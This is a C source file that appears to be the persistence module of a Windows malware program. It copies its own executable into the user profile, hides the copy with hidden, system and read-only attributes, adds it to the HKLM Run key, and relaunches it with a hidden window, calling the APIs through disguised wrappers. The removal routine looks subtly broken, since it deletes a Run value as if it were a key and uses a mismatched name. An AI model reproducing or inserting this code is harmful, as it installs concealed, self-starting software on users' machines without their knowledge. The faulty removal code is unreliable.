#include "global.h"

void AddStartup(void)
{
    HKEY myKeyz;
    char *userprofile = getenv("USERPROFILE");
    char filename[MAX_PATH], installpath[MAX_PATH];

    GetModuleFileName(GetModuleHandle(NULL), filename, sizeof(filename)); // Grab current filename
    sprintf(installpath, "%s\\%s", userprofile, exename); // C:\Documents and Settings\User\exename

    DeleteFile(installpath);   // Delete original copy
    CopyFile(filename, installpath, FALSE); // Move myself to C:\Documents and Settings\User\exename

    SetFileAttributes(installpath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

    my_RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &myKeyz, NULL);
    my_RegSetValueEx(myKeyz, "StartupTest", 0, REG_SZ, installpath, strlen(installpath));
    my_RegCloseKey(myKeyz);

    // installed, lets start
    my_ShellExecute(0,"open",installpath,NULL,NULL,SW_HIDE);
    Sleep(2250); //wait a few sec's..
}

void RemoveStartup(void)
{
    char subkey[MAX_PATH], installpath[MAX_PATH];
    char *userprofile = getenv("USERPROFILE");

    sprintf(installpath, "%s\\%s", userprofile, exename); // C:\Documents and Settings\User\exename
    sprintf(subkey, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\%s", regname);

    RegDeleteKey(HKEY_LOCAL_MACHINE, subkey);
    MoveFileEx(installpath, "Trashed.exe", MOVEFILE_DELAY_UNTIL_REBOOT);
}
